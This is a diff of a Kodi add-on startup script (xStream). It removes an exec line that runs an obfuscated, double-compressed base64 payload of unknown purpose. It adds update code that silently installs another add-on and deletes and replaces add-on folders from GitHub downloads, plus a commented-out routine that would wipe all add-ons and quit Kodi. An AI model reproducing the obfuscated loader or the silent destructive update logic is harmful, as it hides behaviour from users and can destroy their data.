@@ -1,3 +1,213 @@
+# -*- coding: utf-8 -*-
+# Python 3
 
-import zlib, base64
-exec(zlib.decompress(base64.b64decode(zlib.decompress(base64.b64decode('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')))).decode('utf-8'))
+import os
+import json
+import re
+import xbmc
+import xbmcaddon
+import xbmcgui
+import time
+
+from xbmcaddon import Addon
+from resources.lib.config import cConfig
+from resources.lib import tools
+from xbmc import LOGERROR,  LOGDEBUG, log
+from resources.lib.handler.requestHandler import cRequestHandler
+from resources.lib.handler.pluginHandler import cPluginHandler
+from resources.lib import updateManager
+from resources.lib.utils import addonPath, translatePath
+
+HEADERMESSAGE = cConfig().getLocalizedString(30151)
+LOGMESSAGE = cConfig().getLocalizedString(30166)
+
+# xStream = xbmcaddon.Addon().getAddonInfo('id')
+AddonName = xbmcaddon.Addon().getAddonInfo('name')
+
+# ResolverUrl Addon Data
+RESOLVE_ADDON_DATA_PATH = translatePath(os.path.join('special://home/userdata/addon_data/script.module.resolveurl'))
+
+# Pfad der update.sha
+PLUGIN_SHA = os.path.join(translatePath(Addon().getAddonInfo('profile')), "update_sha")
+RESOLVE_SHA = os.path.join(translatePath(RESOLVE_ADDON_DATA_PATH), "update_sha")
+
+# xStream Installationspfad
+ADDON_PATH = translatePath(os.path.join('special://home/addons/', '%s'))
+
+# Update Info beim Kodi Start
+def infoDialog(message, heading=AddonName, icon='', time=5000, sound=False):
+    if icon == '': icon = xbmcaddon.Addon().getAddonInfo('icon')
+    elif icon == 'INFO': icon = xbmcgui.NOTIFICATION_INFO
+    elif icon == 'WARNING': icon = xbmcgui.NOTIFICATION_WARNING
+    elif icon == 'ERROR': icon = xbmcgui.NOTIFICATION_ERROR
+    xbmcgui.Dialog().notification(heading, message, icon, time, sound=sound)
+
+
+# Aktiviere xStream Addon
+def enableAddon(ADDONID):
+    struktur = json.loads(xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Addons.GetAddonDetails","id":1,"params": {"addonid":"%s", "properties": ["enabled"]}}' % ADDONID))
+    if 'error' in struktur or struktur["result"]["addon"]["enabled"] != True:
+        count = 0
+        while True:
+            if count == 5: break
+            count += 1
+            xbmc.executebuiltin('EnableAddon(%s)' % (ADDONID))
+            xbmc.executebuiltin('SendClick(11)')
+            xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","id":1,"params":{"addonid":"%s", "enabled":true}}' % ADDONID)
+            xbmc.sleep(500)
+            try:
+                struktur = json.loads(xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Addons.GetAddonDetails","id":1,"params": {"addonid":"%s", "properties": ["enabled"]}}' % ADDONID))
+                if struktur["result"]["addon"]["enabled"] == True: break
+            except:
+                pass
+
+# Überprüfe Abhängigkeiten
+def checkDependence(ADDONID):
+    isdebug = True
+    if isdebug:
+        log(__name__ + ' - %s - checkDependence ' % ADDONID, LOGDEBUG)
+    try:
+        addon_xml = os.path.join(ADDON_PATH % ADDONID, 'addon.xml')
+        with open(addon_xml, 'rb') as f:
+            xml = f.read()
+        pattern = '(import.*?addon[^/]+)'
+        allDependence = re.findall(pattern, str(xml))
+        for i in allDependence:
+            try:
+                if 'optional' in i or 'xbmc.python' in i: continue
+                pattern = 'import.*?"([^"]+)'
+                IDdoADDON = re.search(pattern, i).group(1)
+                if os.path.exists(ADDON_PATH % IDdoADDON) == True and xbmcaddon.Addon().getSetting('enforceUpdate') != 'true':
+                    enableAddon(IDdoADDON)
+                else:
+                    xbmc.executebuiltin('InstallAddon(%s)' % (IDdoADDON))
+                    xbmc.executebuiltin('SendClick(11)')
+                    enableAddon(IDdoADDON)
+            except:
+                pass
+    except Exception as e:
+        log(__name__ + ' %s - Exception ' % e, LOGERROR)
+
+def delHtmlCache():
+    # Html Cache beim KodiStart nach (X) Tage löschen
+    deltaDay = int(cConfig().getSetting('cacheDeltaDay', 2))
+    deltaTime = 60*60*24*deltaDay # Tage
+    currentTime = int(time.time())
+    # alle x Tage
+    if currentTime >= int(cConfig().getSetting('lastdelhtml', 0)) + deltaTime:
+        cRequestHandler('').clearCache() # Cache löschen
+        cConfig().setSetting('lastdelhtml', str(currentTime))
+
+# kasi - Code für Zwangsupdate - erweiterte version
+def checkVersion(xs='xstream'):
+    try:
+        import requests, re, xbmc
+        from xbmcaddon import Addon
+        if xs.lower() == 'xship':
+            addonId = 'plugin.video.xship'
+            if not xbmc.getCondVisibility("System.HasAddon(%s)" % addonId):
+                xbmc.executebuiltin('InstallAddon(%s)' % addonId)
+                xbmc.executebuiltin('SendClick(11)')
+            try: addonInfo = Addon(addonId).getAddonInfo
+            except: return
+            url = 'https://raw.githubusercontent.com/watchone/watchone.github.io/refs/heads/repo/plugin.video.xship/addon.xml'
+            url2 = 'https://github.com/watchone/watchone.github.io/raw/refs/heads/repo/plugin.video.xship/%s'
+        elif xs.lower() == 'xstream':
+            addonId = 'plugin.video.xstream'
+            if not xbmc.getCondVisibility("System.HasAddon(%s)" % addonId):
+                xbmc.executebuiltin('InstallAddon(%s)' % addonId)
+                xbmc.executebuiltin('SendClick(11)')
+            try: addonInfo = Addon(addonId).getAddonInfo
+            except: return
+            url = 'https://raw.githubusercontent.com/streamxstream/xStreamRepo/refs/heads/repo/zips/plugin.video.xstream/addon.xml'
+            url2 = 'https://github.com/streamxstream/xstreamRepo/raw/refs/heads/repo/zips/plugin.video.xstream/%s'
+        else: return
+
+        addonVersion = addonInfo('version')
+        r = requests.get(url)
+        if r.status_code != 200 : return
+        remoteVersion = re.findall('version="([^"]+)', str(r.content))[1]
+        if addonVersion == remoteVersion: return
+
+        ## TODO
+        # addonVersionInt = int(addonVersion.replace('.', ''))
+        # remoteVersionInt = int(remoteVersion.replace('.', ''))
+        # if addonVersionInt > remoteVersionInt + 100 and xs == 'xstream':
+        #     from resources.lib.utils import countdown, kill, remove_dir
+        #     remove_dir(translatePath('special://home/addons/'))
+        #     # Kodi beenden
+        #     xbmc.executebuiltin('Quit')
+        #     exit()
+
+        from os import path
+        from xbmcvfs import delete
+        from resources.lib.utils import download_url, unzip, remove_dir
+        addonPath = translatePath('special://home/addons/%s') % addonId
+        zipfile = '%s-%s.zip' % (addonId, remoteVersion)
+        url =  url2 % zipfile
+        src = translatePath(path.join('special://temp', url.split('/')[-1]))
+        dest = translatePath('special://home/addons')
+        download_url(url, src, dp=True)  # dp - progressDialog nicht anzeigen
+        remove_dir(addonPath)
+        unzip(src, dest, folder=None)
+        delete(src)
+        from xbmc import executebuiltin, getInfoLabel
+        # executebuiltin("UpdateLocalAddons()") # kasi - ist das nötig?
+        profil = getInfoLabel('System.ProfileName')
+        if profil:  executebuiltin('LoadProfile(' + profil + ',prompt)')
+    except:
+        pass
+
+
+def main():
+    if xbmcaddon.Addon().getAddonInfo('id') == 'plugin.video.xstream': checkVersion('xstream')
+    if xbmcaddon.Addon().getSetting('githubUpdateDevXstream') == 'true':
+        #xbmcaddon.Addon().setSetting('githubUpdateXstream', 'false')
+        status1 = updateManager.xStreamDevUpdate(True)
+        cRequestHandler('').clearCache()  # Cache löschen
+        if Addon().getSetting('update.notification') == 'full':  # Benachrichtung xStream vollständig
+            infoDialog(cConfig().getLocalizedString(30112), sound=False, icon='INFO', time=10000)  # Suche Updates
+            if status1 == True: infoDialog(cConfig().getLocalizedString(30113), sound=False, icon='INFO', time=6000)
+            if status1 == False: infoDialog(cConfig().getLocalizedString(30114), sound=True, icon='ERROR')
+            if status1 == None: infoDialog(cConfig().getLocalizedString(30115), sound=False, icon='INFO', time=6000)
+        else:
+            if status1 == True: infoDialog(cConfig().getLocalizedString(30113), sound=False, icon='INFO', time=6000)
+            if status1 == False: infoDialog(cConfig().getLocalizedString(30114), sound=True, icon='ERROR')
+
+
+    # Starte Resolver Update wenn auf Github verfügbar
+    if os.path.isfile(RESOLVE_SHA) == False or Addon().getSetting('githubUpdateResolver') == 'true'  or Addon().getSetting('enforceUpdate') == 'true':
+        status2 = updateManager.resolverUpdate(True)
+        if Addon().getSetting('update.notification') == 'full': # Benachrichtigung Resolver vollständig
+            infoDialog(cConfig().getLocalizedString(30112), sound=False, icon='INFO', time=10000)   # Suche Updates
+            if status2 == True: infoDialog('Resolver ' + xbmcaddon.Addon().getSetting('resolver.branch') + cConfig().getLocalizedString(30116), sound=False, icon='INFO', time=6000)
+            if status2 == False: infoDialog(cConfig().getLocalizedString(30117), sound=True, icon='ERROR')
+            if status2 == None: infoDialog(cConfig().getLocalizedString(30118), sound=False, icon='INFO', time=6000)
+            if xbmcaddon.Addon().getSetting('enforceUpdate') == 'true': xbmcaddon.Addon().setSetting('enforceUpdate', 'false')
+        else:
+            if status2 == True: infoDialog('Resolver ' + xbmcaddon.Addon().getSetting('resolver.branch') + cConfig().getLocalizedString(30116), sound=False, icon='INFO', time=6000)
+            if status2 == False: infoDialog(cConfig().getLocalizedString(30117), sound=True, icon='ERROR')
+            if xbmcaddon.Addon().getSetting('enforceUpdate') == 'true': xbmcaddon.Addon().setSetting('enforceUpdate', 'false')
+
+    # Startet Überprüfung der Abhängigkeiten
+    checkDependence('plugin.video.xstream')
+
+    # Startet Domain Überprüfung und schreibt diese in die settings.xml
+    cPluginHandler().checkDomain()
+
+    # Wenn neue settings vorhanden oder geändert in addon_data dann starte Pluginhandler und aktualisiere die PluginDB um Daten von checkDomain mit aufzunehmen
+    try:
+        if xbmcaddon.Addon().getSetting('newSetting') == 'true':
+            cPluginHandler().getAvailablePlugins()
+    except Exception:
+        pass
+
+    # Changelog Popup in den "settings.xml" ein bzw. aus schaltbar
+    if xbmcaddon.Addon().getSetting('popup.update.notification') == 'true':
+        tools.changelog()
+
+    # Html Cache beim KodiStart nach (X) Tage löschen
+    delHtmlCache()
+
+if __name__ == "__main__":
+    main()
